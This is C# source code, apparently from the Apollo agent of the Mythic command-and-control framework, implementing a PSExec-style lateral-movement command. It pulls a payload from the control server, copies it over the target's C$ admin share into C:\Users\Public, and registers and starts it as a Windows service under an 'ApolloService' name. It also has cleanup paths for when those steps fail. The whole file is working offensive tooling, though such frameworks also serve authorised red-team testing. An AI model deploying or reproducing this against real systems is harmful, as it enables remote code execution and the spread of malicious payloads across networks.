#define COMMAND_NAME_UPPER

#if DEBUG
#undef PSEXEC
#define PSEXEC
#endif

#if PSEXEC

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Mythic.Structs;
using Apollo.Credentials;
using Apollo.Jobs;
using Apollo.Tasks;
using Apollo.Utils;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System.ServiceProcess;
using System.Runtime.InteropServices;

namespace Apollo.CommandModules.LateralMovement
{
    public struct PSExecParameters
    {
        public string computer;
        public string template;
        public string remote_path;
        public string service_name;
        public string display_name;
    }

    internal class PSExec
    {
        public static void Execute(Job job, Agent agent)
        {
            byte[] templateFile;
            PSExecParameters args;
            ApolloTaskResponse resp;
            string formattedRemotePath;
            string remotePath;
            string fileGuid = Guid.NewGuid().ToString();
            bool bTemplateFileWritten = false;
            ServiceController resultantService = null;

            args = JsonConvert.DeserializeObject<PSExecParameters>(job.Task.parameters);
            if (string.IsNullOrEmpty(args.computer))
            {
                job.SetError("Missing required parameter: computer");
                return;
            }
            if (string.IsNullOrEmpty(args.template))
            {
                job.SetError("Missing required parameter: template");
                return;
            }

            if (string.IsNullOrEmpty(args.remote_path))
            {
                formattedRemotePath = $"\\\\{args.computer}\\C$\\Users\\Public\\{fileGuid}.exe";
                remotePath = $"C:\\Users\\Public\\{fileGuid}.exe";
            }
            else
            {
                if (Directory.Exists(args.remote_path))
                {
                    args.remote_path = Path.Combine(args.remote_path, $"{fileGuid}.exe");
                }
                remotePath = args.remote_path;
                formattedRemotePath = $"\\\\{args.computer}\\{args.remote_path.Replace(':', '$')}";
            }

            if (string.IsNullOrEmpty(args.service_name))
                args.service_name = $"ApolloService-{fileGuid}";
            if (string.IsNullOrEmpty(args.display_name))
                args.display_name = $"Apollo Service: {fileGuid}";

            templateFile = agent.Profile.GetFile(job.Task.id, args.template, agent.Profile.ChunkSize);
            if (templateFile.Length == null || templateFile.Length == 0)
            {
                job.SetError($"Unable to retrieve template ID: {args.template}");
                return;
            }

            try
            {
                File.WriteAllBytes(formattedRemotePath, templateFile);
                bTemplateFileWritten = true;
            }
            catch (Exception ex)
            {
                job.SetError($"Unable to write file to {formattedRemotePath}. Reason: {ex.Message}");
                return;
            }

            resp = new ApolloTaskResponse(job.Task, $"Copied payload to {formattedRemotePath}");
            job.AddOutput(resp);

            try
            {
                if (!Utils.ServiceUtils.InstallService(args.computer, args.service_name, args.display_name, remotePath))
                {
                    string errMsg = $"Error installing service \"{args.service_name}\" on {args.computer}. Last Win32 Error: {Marshal.GetLastWin32Error()}";
                    try
                    {
                        if (File.Exists(formattedRemotePath))
                            File.Delete(formattedRemotePath);
                    }
                    catch (Exception ex) { errMsg += $"\n\nError deleting service executable on remote host. Reason: {ex.Message}"; }
                    job.SetError(errMsg);
                    return;
                }
            }
            catch (Exception ex)
            {
                string errMsg = $"Error installing service on \"{args.service_name}\" on {args.computer}. Reason: {ex.Message}";
                try
                {
                    if (File.Exists(formattedRemotePath))
                        File.Delete(formattedRemotePath);
                }
                catch (Exception ex2) { errMsg += $"\n\nError deleting service executable on remote host. Reason: {ex2.Message}"; }
                job.SetError(errMsg);
                return;
            }

            resp = new ApolloTaskResponse(job.Task, $"Installed service \"{args.service_name}\" on {args.computer}");
            job.AddOutput(resp);

            try
            {
                if (!Utils.ServiceUtils.StartService(args.computer, args.service_name))
                {
                    string errMsg = $"Unable to start service \"{args.service_name}\" on {args.computer}. Last Win32Error: {Marshal.GetLastWin32Error()}";
                    try
                    {
                        if (File.Exists(formattedRemotePath))
                            File.Delete(formattedRemotePath);
                    }
                    catch (Exception ex) { errMsg += $"\n\nError deleting service executable on remote host. Reason: {ex.Message}"; }

                    try
                    {
                        if (!Utils.ServiceUtils.UninstallService(args.computer, args.service_name))
                        {
                            errMsg += $"\n\nError uninstalling service {args.service_name} on {args.computer}. Last Win32Error: {Marshal.GetLastWin32Error()}";
                        }
                    }
                    catch (Exception ex) { errMsg += $"\n\nError uninstalling service {args.service_name} on {args.computer}. Reason: {ex.Message}"; }
                    job.SetError(errMsg);
                    return;
                }
            }
            catch (Exception ex)
            {
                if (Utils.ServiceUtils.GetService(args.computer, args.service_name, out resultantService))
                {
                    if (resultantService.Status == ServiceControllerStatus.Running || resultantService.Status == ServiceControllerStatus.StartPending)
                    { }
                    else
                    {
                        string errMsg = "";
                        if (ex.GetType() == typeof(System.InvalidOperationException))
                            errMsg += $"Error starting service: {ex.Message}";
                        try
                        {
                            if (File.Exists(formattedRemotePath))
                                File.Delete(formattedRemotePath);
                        }
                        catch (Exception ex2) { errMsg += $"\n\nError deleting service executable on remote host. Reason: {ex2.Message}"; }

                        try
                        {
                            if (!Utils.ServiceUtils.UninstallService(args.computer, args.service_name))
                            {
                                errMsg += $"\n\nError uninstalling service {args.service_name} on {args.computer}. Last Win32Error: {Marshal.GetLastWin32Error()}";
                            }
                        }
                        catch (Exception ex3) { errMsg += $"\n\nError uninstalling service {args.service_name} on {args.computer}. Reason: {ex3.Message}"; }
                        job.SetError(errMsg);
                        return;
                    }
                }
            }

            try
            {
                if (resultantService == null)
                {
                    if (!ServiceUtils.GetService(args.computer, args.service_name, out resultantService))
                    {
                        job.SetError($"Could not find service {args.service_name} on {args.computer}");
                        return; // probably need to delete remote file
                    }
                }
                job.SetComplete($@"
Service started on {args.computer}!
    
DisplayName : {resultantService.DisplayName}
ServiceName : {resultantService.ServiceName}
Status      : {resultantService.Status}
CanStop     : {resultantService.CanStop}");
            }
            catch (Exception ex)
            {
                string errMsg = "Could not find service on remote host.";
                try
                {
                    if (File.Exists(formattedRemotePath))
                        File.Delete(formattedRemotePath);
                }
                catch (Exception ex2) { errMsg += $"\n\nError deleting service executable on remote host. Reason: {ex2.Message}"; }
                try
                {
                    if (!Utils.ServiceUtils.UninstallService(args.computer, args.service_name))
                    {
                        errMsg += $"\n\nError uninstalling service {args.service_name} on {args.computer}. Last Win32Error: {Marshal.GetLastWin32Error()}";
                    }
                }
                catch (Exception ex3) { errMsg += $"\n\nError uninstalling service {args.service_name} on {args.computer}. Reason: {ex3.Message}"; }
                job.SetError(errMsg);
                return;
            }

        }
    }
}
#endif